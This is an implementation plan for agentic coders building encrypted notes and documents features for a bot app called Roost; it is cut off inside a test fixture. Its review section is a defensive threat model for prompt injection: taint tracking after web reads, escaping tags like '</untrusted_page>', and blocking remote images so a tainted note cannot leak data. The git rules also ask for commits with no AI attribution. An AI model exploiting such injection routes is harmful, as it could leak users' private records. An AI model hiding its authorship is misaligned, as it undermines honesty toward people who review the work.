# Roost M2: Notes and Documents Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Notes and documents (docs, sheets, PDFs) belong to the user. Every bot holding the Notes or Docs role works on the same encrypted records, together with any other role it holds, so "save all my tasks in a document" just works. Each bot's Board gains Notes and Documents tabs, and all of it deploys onto the live Roost without losing a row.

**Architecture:** Two new roles, `notes` and `docs`, are role files over two new domain packages, `roost/notes/` and `roost/documents/`. They plug into M1's `DomainTools` dispatch, gate kinds, taint provenance and Keep button exactly like tasks and money. A note (schema v9) is a row with an encrypted title, markdown body and tags, an HMAC title key for exact-title and `[[wikilink]]` lookups, and a `revision` for compare-and-swap. A document (v10) is one encrypted blob per file: a Univer doc/sheet JSON snapshot, or a PDF's bytes as base64, under AAD `docs:payload` / `sheets:payload` / `pdf:payload`, with the same revision compare-and-swap. Harvested LazyClaw code supplies the wikilink and front-matter parsers and the Univer snapshot and PDF helpers. The web Board gains lazy-loaded Notes and Documents panels. Their Univer editors are built from the individual Apache-2.0 presets, never from the `@univerjs/presets` meta package.

**Tech Stack:** Python 3.12 (uv), FastAPI, aiosqlite, pydantic 2, cryptography (`enc:v2` + AAD). New Python: pypdf (BSD-3-Clause), pdfplumber (MIT), reportlab (BSD). Web: Vite + React 19 + TypeScript, vitest + Testing Library, Playwright. New web: `@univerjs/core`, `@univerjs/themes`, `@univerjs/preset-docs-core`, `@univerjs/preset-sheets-core` (Apache-2.0, 0.24.0), `rxjs` (Apache-2.0), `react-pdf` (MIT) with `pdfjs-dist` (Apache-2.0), `react-markdown` + `remark-gfm` (MIT).

**Spec:** `docs/specs/2026-10-12-roost-design.md`, sections §3.1 (docs/sheets/pdf carry over, plus the Univer license fix), §4.7 (storage and encryption), §6.4 and §6.6 (Notes, Docs), §8.2 (taint), and §11 steps 15 and 15a. The orchestrator's decisions **D1–D7** (2026-10-14) are binding, and each task quotes the ones it implements. The M1 plan (`docs/plans/2026-10-13-roost-m1-roles-tasks-finance.md`) is the source of the patterns reused here.

## Global Constraints

- Path guard first, every task: `git -C /Users/blckit/Desktop/Code_Projects/roost rev-parse --show-toplevel` must print `/Users/blckit/Desktop/Code_Projects/roost`, and `git -C /Users/blckit/Desktop/Code_Projects/roost branch --show-current` must print `night-1`. If either check fails, stop.
- Edit only under `/Users/blckit/Desktop/Code_Projects/roost`. `/Users/blckit/Desktop/Code_Projects/lazyclaw` is a **read-only** harvest source (same author, MIT). Never edit it, never run its `make` targets, and never touch its containers (`lazyclaw`, `lazyclaw-web`, `lazyclaw-caddy`, `lazyclaw-n8n`) or `/Users/blckit/Desktop/Code_Projects/lazyclaw/data`. Make harvest copies with `cat`/`sed -n` reads only. LazyClaw HEAD for every provenance header is **`21e1002`**.
- Clean room (spec §10.3): never open the open-dot / open-dots repos, `~/Roost-review/` or `~/.claude/projects/**`. No browser MCP tools. No subagents.
- Docker: touch only objects named `roost*` (project `roost`, container `roost-gateway-1`, image `roost-gateway:dev`). Before any image build or `npm install`, run the disk guard: `df -g /System/Volumes/Data | awk 'NR==2{print $4}'` must print ≥ 8. Otherwise stop and report (`make up` and `make e2e` run the guard themselves).
- **Live data:** `~/Roost/data` (bind-mounted at `/data`) holds the user's real account. Every schema change is an additive, idempotent migration tested against a database built from the **current** schema with rows in it (`tests/fixtures/schema_v8.sql`, Task 1). Tests and scripts never read or write `~/Roost/data`; tests run in the `tests/conftest.py` tripwire temp dirs.
- New runtime dependencies. All are permissive, and each is verified in the step that adds it:
  - **Python:** `pypdf>=4.0.0` (BSD-3-Clause), `pdfplumber>=0.11.0` (MIT; it brings pdfminer.six MIT, pypdfium2 Apache-2.0 / BSD-3-Clause and Pillow MIT-CMU), `reportlab>=4.0.0` (BSD; it brings Pillow and charset-normalizer MIT). Spec §3.1 names all three as the documents' server libraries.
  - **Python, not added:** python-docx and openpyxl. M2 has no .docx/.xlsx import or export, so the harvested code doesn't need them (D2).
  - **Web, exact versions:** `@univerjs/core@0.24.0`, `@univerjs/themes@0.24.0`, `@univerjs/preset-docs-core@0.24.0`, `@univerjs/preset-sheets-core@0.24.0`, `rxjs@7.8.2`, `react-pdf@10.4.1`, `react-markdown@10.1.0`, `remark-gfm@4.0.1`.
  - **Never:** `@univerjs/presets` or any `@univerjs-pro/*` package.
- WS/HTTP contract changes are **additive only**:
  - New frames `notes_changed` and `documents_changed`, and new routes `/api/notes*` and `/api/documents*`.
  - `RoleOut.board_tab` gains `"notes"` and `"documents"`, and `GET /api/presets` gains `office` and `writer`.
  - The web `ApiError` gains a `body` field.
  - M1's `list_tasks` and `list_expenses` gain an optional `offset` (default 0). A capped listing ends with "…and N more: call again with offset=K" (Task 3).
  - The SPA's static responses gain `Content-Security-Policy: img-src 'self' data: blob:` (Task 5). The web app draws no remote image today.
  - No existing field, frame or route changes meaning.
- Encryption: every user-content column is `enc:v2` with `user_aad(user_id, "<table>:<column>")`:
  - Notes: `notes:title`, `notes:content` and `notes:tags` (spec §4.7's contexts).
  - Documents: `documents:title` and `documents:tags`. The payload uses its kind's context: `docs:payload`, `sheets:payload` or `pdf:payload` (spec §4.7, LazyClaw's contexts).
  - Plaintext is limited to ids, `kind`, timestamps, `revision`, `pages`, `pinned`, the taint bit and `title_key`. `title_key` is HMAC(dek, folded title) and never the title itself.
- Every query on user data has `user_id` in its `WHERE`. Another user's id gives 404 or `None`.
- Vocabulary (spec §7.4): Bot, **Board**, Notes, Documents. Tainted rows are marked **"from web content"** in the UI and `[from web content]` in tool results. Record text that reaches a prompt through a tool is user data, so it is `html.escape`d by its producer (D2: "escape <, >").
- Code rules:
  - TDD: write the test, run it, see it FAIL, implement, see it PASS.
  - Files ≤ 800 lines (typical 200–400). New functions are < 50 lines.
  - Harvested functions keep their bodies verbatim, which is M1's precedent (`roost/tasks/steps.py::normalize_steps`).
  - Frozen dataclasses, no mutation of shared data, and pydantic at every HTTP and tool-argument boundary.
  - Plain-language error messages, no magic numbers (`roost/constants.py`), and tests never call a real LLM.
- Before every commit, both must be green: `uv run pytest --cov=roost --cov-fail-under=80 -q` and `cd web && npm test && npm run build`. From Task 4 on, also `npm run size` (the main bundle budget, D4).
- Git rules:
  - Stage files **by name**, never with `-A`, `-a` or `.`.
  - Use conventional messages, with **no Co-Authored-By or any AI attribution**, and never push.
  - Commit harvest copies, before adaptation, with a `harvest:` message.
- Provenance: every harvested Python file starts with `# SPDX-License-Identifier: MIT` and `# Harvested from LazyClaw <path> @ 21e1002, adapted for Roost`; TypeScript files use `//` comments. `web/src/components/documents/univer/createUniver.ts` adapts Apache-2.0 code from `@univerjs/presets`, so it carries `// SPDX-License-Identifier: Apache-2.0` and gets a `THIRD_PARTY_NOTICES.md` entry.

## Review Focus

1. **"I'm isolated" across roles** (the user's own complaint). A bot holding tasks + docs, asked "save all my tasks in a document", must call `list_tasks` then `create_doc`, and the doc must list the tasks. Finance + docs must likewise turn the October expenses into a sheet. The bot's prompt must say its roles work together.
   - **All** of them, not the first 50: `list_tasks` and `list_expenses` take an `offset`, a capped listing ends with "…and N more: call again with offset=K", and the prompt says to page until nothing more is listed.
   - **The bots the user already has.** The deploy adds no role, so Life admin (tasks + finance) and Chief (no roles) never hold `create_doc`. A bot holding a reading tool but not the docs role is told to gather the records, then `ask_bot docs` with the full content. With no docs holder on the team, it tells the user to add the Docs role on its Desk (Roles card), and the main bot may `suggest_bot` an Office bot. Task 8 reports which live bots hold tasks or finance but not docs.

   → Task 3 `test_save_all_my_tasks_in_a_document`, `test_a_sheet_of_my_october_expenses`, `test_all_sixty_tasks_reach_the_document`, `test_a_long_month_of_expenses_says_how_many_more`, `test_a_tasks_only_bot_hands_the_list_to_the_docs_teammate`, `test_an_office_bot_is_told_its_roles_work_together`, `test_a_bot_without_docs_hands_its_records_to_the_docs_teammate`, `test_with_no_docs_holder_the_user_is_told_where_to_add_the_role`; Task 7 E2E; Task 8 Step 5.
2. **Two places edit one note or document.** A save from a stale revision must get a 409 that carries the current copy, never a silent overwrite. A tool write that lands between a read and a write must not be lost. → Task 1 `test_a_stale_revision_is_refused_with_the_current_note`, `test_a_write_landing_between_read_and_write_is_a_conflict_not_a_clobber`, `test_a_stale_note_save_is_409_with_the_current_note`; Task 2 `test_a_stale_document_save_is_409_with_the_current_copy`; Task 5 NoteEditor "Load the latest / Keep mine"; Task 6 UniverEditor conflict.
3. **Outside content reaching notes and documents.** After a page read in the same run, `add_note` and `create_doc` are stored tainted, and append, update and delete are refused. Reading a web-made note, a document made from tainted tasks or an uploaded PDF taints the run. A note body containing `<script>` or `</untrusted_page>` reaches the model escaped. → Task 1 `test_a_note_added_after_reading_a_page_is_stored_tainted_and_marked`, `test_a_tainted_run_cannot_change_or_delete_a_note`, `test_finding_a_web_made_note_taints_the_run`, `test_read_note_escapes_markup_and_lists_its_links`; Task 3 `test_a_doc_made_from_tainted_tasks_is_tainted`, `test_an_uploaded_pdf_taints_the_run_that_reads_it`.
   - **The preview is not a way out.** A tainted run may still create a note, so the Notes preview never fetches anything a note names: no remote image is drawn (`[image: alt]` instead), every link shows its real hostname (M1's `renderBody` rule), and the SPA is served with `Content-Security-Policy: img-src 'self' data: blob:`. A malformed `#wikilink/` href renders as plain text, never a crash. → Task 5 NoteEditor "never draws a remote image…", `tests/test_static.py::test_the_spa_never_loads_remote_images`.
4. **Spanish text in search.** "cumpleanos" must find "cumpleaños" and "ORQUIDEAS" must find "orquídeas". Every word of the query must match, and an empty search lists the newest notes first. → Task 1 `test_search_ignores_case_and_accents`, `test_every_query_word_must_match`, `test_an_empty_query_lists_newest_first_and_a_tag_filters`.
5. **Big or broken input.**
   - A PDF over the limit is 413, a non-PDF is 422 and a wrong content type is 415.
   - A sheet of 501 rows is refused plainly with nothing stored.
   - A payload that isn't the document's kind of snapshot is 422.
   - A damaged stored blob reads back as a plain 422, not a crash.
   - Reads are bounded by the work they do, not only by what they print (the gateway has `mem_limit: 1g`). A sheet is rendered from its capped 30×10 window, never the dense `as_grid`. No cell may sit past `ZZ100000`, whether written by a tool edit or a Board save. A PDF's text is read page by page and stops at the cap, under a timeout.

   → Task 2 `test_pdf_upload_limits`, `test_a_damaged_blob_is_a_plain_422`, `test_saving_a_payload_of_the_wrong_kind_is_422`, `test_a_far_off_cell_is_read_capped_without_the_dense_grid`, `test_a_cell_past_the_sheets_corner_is_refused`, `test_a_sheet_payload_with_a_far_off_cell_is_422`, `test_a_long_pdf_is_read_only_until_the_cap`; Task 3 `test_create_sheet_refuses_too_many_rows`, `test_update_sheet_cells_refuses_a_cell_past_the_corner`.

---

## Shared Contract (every task uses these exact names)

### Schema versions (`roost/db/migrations.py`, `PRAGMA user_version`)

| Version | Task | Adds |
|---|---|---|
| 0–8 | — | Night-1 + M1, live today. Frozen as `tests/fixtures/schema_v8.sql` (Task 1). |
| 9 | 1 | `notes` table, with `idx_notes_user_updated` and `idx_notes_user_title` |
| 10 | 2 | `documents` table (`kind` CHECK `doc`/`sheet`/`pdf`), with `idx_documents_user` |

### Role files

- `roost/bots/roles/notes.md` (Task 1):
  - `tools: [add_note, find_notes, read_note, append_to_note, update_note, delete_note]`
  - `board_tab: notes`
- `roost/bots/roles/docs.md` (Task 3):
  - `tools: [list_documents, read_document, create_doc, create_sheet, append_to_doc, update_sheet_cells, delete_document, make_pdf_from_doc]`
  - `board_tab: documents`

`RoleDef.board_tab` is `Literal["tasks", "money", "notes", "documents"] | None`.

Gate kinds:

| Kind | Tools |
|---|---|
| `read` | `find_notes`, `read_note`, `list_documents`, `read_document` |
| `write_create` | `add_note`, `create_doc`, `create_sheet`, `make_pdf_from_doc` |
| `write_change` | `append_to_note`, `update_note`, `delete_note`, `append_to_doc`, `update_sheet_cells`, `delete_document` |

### Wire shapes (additive)

- `NoteSummaryOut` = `{id, title, tags: [str], snippet, pinned, revision, created_at, updated_at, created_by_bot, tainted}`.
- `NoteOut` = `NoteSummaryOut` + `{content, links: [{target, title, note_id: str|null}]}`. Here `target` is the folded page key, `title` is the target as written, and `note_id: null` means no note has that title yet.
- `DocumentOut` = `{id, kind: "doc"|"sheet"|"pdf", title, pages: int|null, revision, created_at, updated_at, created_by_bot, tainted}`.
- `DocumentDetailOut` = `DocumentOut` + `{payload: object|null}`. The payload is the Univer snapshot, or `null` for a PDF.
- A conflict (409) body is `{detail: str, current: NoteOut | DocumentDetailOut}`.
- New WS frames, stored and replayed like every frame except `text_delta`:
  - `{type: "notes_changed", seq, change: "created"|"updated"|"deleted", note_id}`
  - `{type: "documents_changed", seq, change: "created"|"updated"|"deleted", document_id, kind}`
- `PresetOut` list order: `life_admin, office, writer, researcher, chief`.

### HTTP routes (every route has `CurrentUser`; every mutating route has `RequireOrigin`)

| Route | Task | Body → Response |
|---|---|---|
| `GET /api/notes?q=&tag=` | 1 | → 200 `[NoteSummaryOut]`. Ranked search when `q` is given, otherwise newest first (pinned on top). |
| `GET /api/notes/{note_id}` | 1 | → 200 `NoteOut` |
| `POST /api/notes` | 1 | `{title?, content?, tags?}` (a title or content is required) → 201 `NoteOut` |
| `PUT /api/notes/{note_id}` | 1 | `{base_revision, title?, content?, tags?, pinned?}` → 200 `NoteOut`, or 409 `{detail, current: NoteOut}` |
| `POST /api/notes/{note_id}/keep` | 1 | → 200 `NoteOut` (clears the taint bit; HTTP only, no tool) |
| `DELETE /api/notes/{note_id}` | 1 | → 204 |
| `GET /api/documents?kind=` | 2 | → 200 `[DocumentOut]`, newest first |
| `GET /api/documents/{id}` | 2 | → 200 `DocumentDetailOut`; 422 when the stored copy can't be read |
| `GET /api/documents/{id}/text` | 2 | → 200 `{text}`: the same text `read_document` shows (doc → markdown, sheet → table, PDF → text), capped |
| `GET /api/documents/{id}/pdf` | 2 | → 200 `application/pdf` (inline, `Cache-Control: no-store`); 404 for a doc or sheet |
| `POST /api/documents` | 2 | `{kind: "doc"|"sheet", title, markdown?, rows?}` → 201 `DocumentOut` |
| `POST /api/documents/pdf?title=` | 2 | raw `application/pdf` body (≤ `MAX_PDF_BYTES`) → 201 `DocumentOut`, stored **tainted** (an uploaded file is outside content, spec §8.2); 415 / 413 / 422 |
| `PUT /api/documents/{id}` | 2 | `{base_revision, title?, payload?}` → 200 `DocumentOut`, or 409 `{detail, current: DocumentDetailOut}` |
| `POST /api/documents/{id}/keep` | 2 | → 200 `DocumentOut` |
| `DELETE /api/documents/{id}` | 2 | → 204 |

### Python names

- `roost/records/revision.py` (1): `RevisionConflict(current)`, an `Exception` whose `.current` is the stored record.
- `roost/records/paging.py` (3): `more_line(total, offset, shown)`, the "…and N more: call again with offset=K" tail of a capped listing, and `OFFSET_PROPERTY`, the specs' `offset` schema.
- `roost/notes/` (1):
  - `wikilinks.py` (harvested): `normalize_page`, `extract_wikilinks`, `extract_wikilinks_full`, `extract_tags`, `Wikilink`.
  - `frontmatter.py` (harvested): `parse_frontmatter`, `serialize_frontmatter`.
  - `text.py` (harvested + Roost): `fold`, `merge_tags`, `first_line`, `note_title`, `UNTITLED_NOTE`.
  - `models.py`: `Note`, `NoteDraft`, `NotePatch`, `NoteLink`, `NOTE_PATCHABLE`.
  - `store.py`: `NoteStore`, `title_key`.
  - `search.py`: `query_terms`, `score`, `rank_notes`.
  - `format.py`: `snippet`, `note_line`, `note_list_text`, `note_text`, `note_summary_out`, `note_out`.
  - `service.py`: `NoteService`.
  - `tool_specs.py`: `NOTE_TOOL_DEFS`.
  - `tools.py`: `NoteTools`.
- `roost/documents/` (2, 3):
  - `doc_snapshot.py`, `markdown_blocks.py`, `sheet_snapshot.py`, `pdf_ops.py` (harvested).
  - `doc_markdown.py`: `doc_from_markdown`, `append_markdown`, `doc_to_markdown`, `doc_plain_text`.
  - `sheet_text.py`: `format_grid`, `sheet_from_rows`.
  - `models.py`: `DocumentKind`, `DOCUMENT_KINDS`, `DocumentMeta`, `Document`, `DocumentDraft`, `DocumentChange`.
  - `store.py`: `DocumentStore`, `PAYLOAD_AAD`.
  - `render.py`: `snapshot_of`, `pdf_bytes_of`, `pdf_text` (page by page, stops at the cap), `document_text`.
  - `format.py`: `KIND_LABEL`, `document_line`, `document_list_text`, `document_out`, `document_detail_out`.
  - `service.py`: `DocumentService`.
  - `cells.py` (2): `SheetCell`, `SheetRows`, `CellEdit` (A1 up to `ZZ100000`), `sheet_cells_in_bounds`.
  - `tool_args.py` (3): the docs tools' argument models.
  - `tool_specs.py` (3): `DOCUMENT_TOOL_DEFS`.
  - `tools.py` (3): `DocumentTools`.
- `roost/talk/instructions.py` (3): `_combine_section(roles, teammates, *, lead)`, the "your roles work together" section, plus the hand-over hint for a bot that reads records but holds no docs role.
- `roost/bots/presets.py` (3): `OFFICE`, `WRITER`.
- Web:
  - API: `api/conflict.ts` (`RevisionConflictError`, `withConflict`), `api/notes.ts`, `api/documents.ts`, and `api/client.ts` (`ApiError.body`, `apiUpload`).
  - Hooks and helpers: `hooks/useThreadRefresh.ts`, `lib/threadsChanged.ts`, `lib/linkHost.ts` (M1's link rule, shared by `MessageRow` and `NotePreview`).
  - Components: `components/notes/*`, `components/documents/*`, `components/board/ConflictNotice.tsx`.
  - Build checks: `scripts/check-bundle.mjs`, `bundle-budget.json`, `tests/licenseGate.ts`.

### Harvest sources (LazyClaw @ `21e1002`, read-only)

| Source | Lines | → Roost |
|---|---|---|
| `lazyclaw/lazybrain/wikilinks.py` | 1–224 | `roost/notes/wikilinks.py` |
| `lazyclaw/lazybrain/frontmatter.py` | all | `roost/notes/frontmatter.py` |
| `lazyclaw/lazybrain/store.py` | 201–216 (`_fold`), 297–320 (`_merge_tags`, `_first_line`) | `roost/notes/text.py` |
| `lazyclaw/skills/builtin/lazybrain/notes.py` | 19–212 (save/update/delete note skills: argument names and meanings) | `roost/notes/tool_specs.py` |
| `lazyclaw/docs/snapshot.py` | 1–245, 306–321, 405–716 | `roost/documents/doc_snapshot.py` |
| `lazyclaw/docs/markdown_blocks.py` | all | `roost/documents/markdown_blocks.py` |
| `lazyclaw/sheets/snapshot.py` | 1–433 | `roost/documents/sheet_snapshot.py` |
| `lazyclaw/pdf/ops.py` | 1–178, 582–620 | `roost/documents/pdf_ops.py` |
| `lazyclaw/skills/builtin/sheets.py` | 72–89 (`_format_grid`) | `roost/documents/sheet_text.py` |
| `lazyclaw/docs/store.py`, `sheets/store.py`, `pdf/store.py`, `gateway/routes/{docs,sheets,pdf}.py` | semantics: one blob per file, AAD contexts, compare-and-swap with 409 + current copy, soft delete, raw PDF route | `roost/documents/store.py`, `roost/gateway/routes/documents.py` |
| `lazyclaw/skills/builtin/{docs,sheets,pdf}.py` | tool names, preview caps (4000 chars) | `roost/documents/tool_specs.py`, `tools.py` |
| `web/src/lib/wikilink.ts` | all | `web/src/components/notes/wikilink.ts` |
| `web/src/components/notes/noteHelpers.ts` | 56–88, 142–149 | `web/src/components/notes/noteHelpers.ts` |
| `web/src/pages/Docs.tsx`, `Sheets.tsx` | Univer lifecycle: mount, create, CommandExecuted / SheetValueChanged autosave, flush on dispose | `web/src/components/documents/univer/*` |
| `web/src/pages/Pdf.tsx` | 16–27 (react-pdf worker setup) | `web/src/components/documents/PdfViewer.tsx` |
| `web/src/pages/Documents.tsx` | 1–9 (one lazy chunk per kind) | `web/src/components/documents/DocumentOpen.tsx` |

Not harvested, on purpose:
- `lazybrain/journal.py` (285 lines; its title refresh calls an LLM) and embeddings/rerank/graph (D1: later).
- `docs/docx_io.py`, `sheets/xlsx_io.py`, `sheets/recalc.py`: .docx/.xlsx import and export and server-side formula recalculation. Univer recalculates in the browser.
- The LazyClaw stores' plaintext `name` and `tags` columns. Roost encrypts both.

## File Structure

```
roost/
  records/revision.py         RevisionConflict                                          (1)
  records/paging.py           more_line (list_tasks / list_expenses offset)              (3)
  tasks/tools.py, tasks/format.py, tasks/tool_specs.py, money/tools.py,
  money/tool_specs.py         offset on list_tasks / list_expenses                      (3)
  gateway/routes/static.py    Content-Security-Policy img-src on the SPA                (5)
  notes/                      wikilinks, frontmatter, text (harvested); models, store,
                              search, format, service, tool_specs, tools                (1)
  documents/                  doc_snapshot, markdown_blocks, sheet_snapshot, pdf_ops
                              (harvested); doc_markdown, sheet_text, models, cells,
                              store, render, format, service                            (2)
                              tool_args, tool_specs, tools                              (3)
  bots/roles/notes.md, docs.md                                                          (1, 3)
  bots/roles.py (board_tab), bots/presets.py (Office, Writer)                           (1, 3)
  talk/tool_catalog.py, talk/domain_tools.py, talk/instructions.py                      (1, 3)
  gateway/routes/notes.py, documents.py; gateway/app.py                                 (1, 2)
  db/migrations.py (v9, v10); constants.py                                              (1, 2, 3)
tests/fixtures/schema_v8.sql, tests/test_migrations_v8.py                               (1, 2)
web/
  scripts/check-bundle.mjs, bundle-budget.json                                          (4)
  src/lib/threadsChanged.ts, src/hooks/useThreadRefresh.ts                              (4)
  src/lib/linkHost.ts; src/components/MessageRow.tsx (uses it)                          (5)
  src/api/conflict.ts, notes.ts, documents.ts; client.ts; types.ts                      (5, 6)
  src/components/board/ConflictNotice.tsx                                               (5)
  src/components/notes/       wikilink.ts, noteHelpers.ts (harvested); NotesBoard, NoteList,
                              NoteEditor, NotePreview, WikilinkChips, useNoteDraft      (5)
  src/components/documents/   DocumentsBoard, DocumentRow, KindIcon, DocumentOpen,
                              PdfViewer, univer/{kit, createUniver, docKit, sheetKit,
                              UniverEditor, useUniverAutosave, DocEditor, SheetEditor}  (6)
  src/styles/notes.css, documents.css                                                   (5, 6)
  tests/licenseGate.ts                                                                  (6)
  e2e/office.spec.ts; playwright.config.ts (ROOST_E2E_PORT)                             (7)
```

---
### Task 1: Migration v9 and the Notes role (harvest)

Implements **D1** (the notes role: encrypted notes with title, markdown body, tags, `[[wikilinks]]` and front matter; decrypt-then-match search ranked by matches + recency; `add_note`, `find_notes`, `read_note`, `append_to_note`, `update_note`, `delete_note` with exact-or-ask names), **D5** for notes (migration v9 tested from v8 with rows; per-user shared rows with taint provenance; Keep), and the notes half of **D4**'s server side (HTTP routes with revision compare-and-swap, the `notes_changed` frame).

**Files:**
- Create: `tests/fixtures/schema_v8.sql` (generated, Step 2), `tests/test_migrations_v8.py`, `tests/test_note_text.py`, `tests/test_note_store.py`, `tests/test_note_tools.py`, `tests/test_notes_api.py`
- Create (harvest, Step 3): `roost/notes/wikilinks.py`, `roost/notes/frontmatter.py`, `roost/notes/text.py`
- Create: `roost/records/revision.py`, `roost/notes/__init__.py`, `roost/notes/models.py`, `roost/notes/store.py`, `roost/notes/search.py`, `roost/notes/format.py`, `roost/notes/service.py`, `roost/notes/tool_specs.py`, `roost/notes/tools.py`, `roost/bots/roles/notes.md`, `roost/gateway/routes/notes.py`
- Modify: `roost/db/migrations.py` (Migration 9), `roost/constants.py`, `roost/bots/roles.py` (`board_tab`), `roost/talk/tool_catalog.py`, `roost/talk/domain_tools.py`, `roost/gateway/app.py`
- Modify tests: `tests/test_suggest_bot.py:150` (the roles enum gains `"notes"`)

**Interfaces:**
- Consumes: `Migration`, `MIGRATIONS` (`roost/db/migrations.py`); `encrypt_field`, `decrypt_field`, `user_aad`, `get_user_dek`, `db_session`; `ToolSpec`, `ToolDef`, `CATALOG`; `RecordContext`, `DomainTools`, `ToolOutcome`; `NamedRef`, `resolve` (`roost/records/resolver.py`); `EventHub.publish`; `CurrentUser`, `RequireOrigin`; test helpers `make_bot`, `make_rig`, `send`, `say`, `team_model`, `wait_idle` (`tests/team_helpers.py`).
- Produces:
  - `RevisionConflict`.
  - `Note`, `NoteDraft`, `NotePatch`, `NoteLink`.
  - `NoteStore(config)`, with `.create`, `.get`, `.list(user_id, *, limit)`, `.with_title`, `.update(user_id, note_id, patch, *, base_revision=None)`, `.keep`, `.delete`.
  - `rank_notes(notes, query, *, tag=None, limit)`.
  - `NoteService(store, events)`, with `.list`, `.all`, `.search`, `.get`, `.links`, `.add`, `.save(user_id, note_id, changes, *, base_revision=None)`, `.append(user_id, note, text)`, `.keep`, `.delete`.
  - `new_note_draft(title, content, tags=())`.
  - `note_out(note, links)`, `note_summary_out(note, query="")`.
  - `NOTE_TOOL_DEFS`, `NoteTools`.
  - `app.state.notes`.
  - The constants below.

- [ ] **Step 1: Path guard**

```bash
git -C /Users/blckit/Desktop/Code_Projects/roost rev-parse --show-toplevel   # /Users/blckit/Desktop/Code_Projects/roost
git -C /Users/blckit/Desktop/Code_Projects/roost branch --show-current       # night-1
```

- [ ] **Step 2: Freeze today's schema (v8) as a fixture — BEFORE adding Migration 9**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run python - <<'PY'
import asyncio, sqlite3, tempfile
from pathlib import Path
import aiosqlite
from roost.db.migrations import apply_migrations, latest_version

assert latest_version() == 8, f"expected schema v8 before M2, got {latest_version()}"

async def build(path: Path) -> None:
    async with aiosqlite.connect(path) as db:
        await db.executescript(Path("roost/db/schema.sql").read_text())
        await db.commit()
        await apply_migrations(db)

path = Path(tempfile.mkdtemp(prefix="roost-v8-")) / "v8.db"   # a throwaway file, never ~/Roost/data
asyncio.run(build(path))
con = sqlite3.connect(path)
rows = con.execute(
    "SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND name NOT LIKE 'sqlite_%' ORDER BY rowid"
).fetchall()
con.close()
header = ("-- Roost schema version 8, frozen by M2 Task 1 (schema.sql + migrations 1-8).\n"
          "-- The live ~/Roost/data/roost.db runs this schema at the start of M2. Never edit.\n\n")
Path("tests/fixtures/schema_v8.sql").write_text(header + ";\n\n".join(r[0] for r in rows) + ";\n")
print("tables/indexes:", len(rows))
PY
grep -c "CREATE" tests/fixtures/schema_v8.sql   # ≥ 27
grep -c "money_topups" tests/fixtures/schema_v8.sql   # ≥ 1
```

- [ ] **Step 3: Harvest — verbatim copies with provenance headers (read-only on LazyClaw), then commit them**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && mkdir -p roost/notes
LC=/Users/blckit/Desktop/Code_Projects/lazyclaw
hdr() { printf '# SPDX-License-Identifier: MIT\n# Harvested from LazyClaw %s @ 21e1002, adapted for Roost\n\n' "$1"; }
{ hdr "lazyclaw/lazybrain/wikilinks.py lines 1-224"; sed -n '1,224p' "$LC/lazyclaw/lazybrain/wikilinks.py"; } > roost/notes/wikilinks.py
{ hdr "lazyclaw/lazybrain/frontmatter.py"; cat "$LC/lazyclaw/lazybrain/frontmatter.py"; } > roost/notes/frontmatter.py
{ hdr "lazyclaw/lazybrain/store.py lines 201-216, 297-320"; sed -n '201,216p;297,320p' "$LC/lazyclaw/lazybrain/store.py"; } > roost/notes/text.py
uv run python -c "import roost.notes.wikilinks, roost.notes.frontmatter"   # the two whole-module copies import cleanly
git -C /Users/blckit/Desktop/Code_Projects/roost add roost/notes/wikilinks.py roost/notes/frontmatter.py roost/notes/text.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "harvest: copy LazyBrain's wikilink, front-matter and note text helpers"
```

(`roost/notes/text.py` is three bare functions until Step 7 adapts it; nothing imports it yet, so the gates stay green.)

- [ ] **Step 4: Write the failing tests**

`tests/test_migrations_v8.py`:

```python
"""Migrations from the schema the live gateway runs at the start of M2 (version 8).

``tests/fixtures/schema_v8.sql`` was frozen by M2 Task 1 from ``schema.sql`` +
migrations 1-8. These tests rebuild that database with rows in every table the
user's account uses today (bots and their roles, Talk, the work queue, rooms,
tasks and money), run ``init_db`` and check that nothing is lost."""

from __future__ import annotations

import sqlite3
from pathlib import Path

import pytest

from roost.config import load_config
from roost.db.connection import get_db_path, init_db
from roost.db.migrations import latest_version

_V8_SCHEMA = Path(__file__).parent / "fixtures" / "schema_v8.sql"
_NOW = "2026-10-14T08:00:00+00:00"
_AVATAR = '{"shape": "round", "color": "#22c55e", "badge": "none"}'
_EXPECTED = {
    "users": 1, "sessions": 1, "bots": 2, "bot_roles": 3, "threads": 2, "messages": 2, "events": 1, "audit": 1,
    "work_items": 1, "runs": 1, "rooms": 1, "room_members": 2, "tasks": 2, "money_projects": 1,
    "money_expenses": 1, "money_topups": 1,
}
_ROWS = (
    "INSERT INTO users (id, username, password_hash, encryption_salt) VALUES ('u1','alice','h','s')",
    "INSERT INTO sessions (id, user_id, expires_at) VALUES ('s1','u1','2099-01-01T00:00:00+00:00')",
    "INSERT INTO bots (id, user_id, name, name_key, job, instructions, avatar, status, created_at, updated_at, "
    f"is_primary) VALUES ('b1','u1','enc:x','k1','enc:x','enc:x','{_AVATAR}','resting','{_NOW}','{_NOW}',1)",
    "INSERT INTO bots (id, user_id, name, name_key, job, instructions, avatar, status, created_at, updated_at) "
    f"VALUES ('b2','u1','enc:y','k2','enc:y','enc:y','{_AVATAR}','resting','{_NOW}','{_NOW}')",
    f"INSERT INTO bot_roles (user_id, bot_id, role_id, added_at) VALUES ('u1','b1','web','{_NOW}')",
    f"INSERT INTO bot_roles (user_id, bot_id, role_id, added_at) VALUES ('u1','b2','tasks','{_NOW}')",
    f"INSERT INTO bot_roles (user_id, bot_id, role_id, added_at) VALUES ('u1','b2','finance','{_NOW}')",
    f"INSERT INTO threads (id, user_id, bot_id, kind, created_at, updated_at) VALUES ('t1','u1','b2','chat','{_NOW}','{_NOW}')",
    f"INSERT INTO threads (id, user_id, bot_id, kind, created_at, updated_at) VALUES ('t2','u1','b1','room','{_NOW}','{_NOW}')",
    "INSERT INTO messages (id, user_id, thread_id, role, body, tainted, seq, created_at) "
    f"VALUES ('m1','u1','t1','user','enc:x',0,1,'{_NOW}')",
    "INSERT INTO messages (id, user_id, thread_id, role, body, tainted, seq, created_at, author_bot_id) "
    f"VALUES ('m2','u1','t1','bot','enc:y',0,2,'{_NOW}','b2')",
    f"INSERT INTO events (user_id, kind, payload, created_at) VALUES ('u1','tasks_changed','enc:x','{_NOW}')",
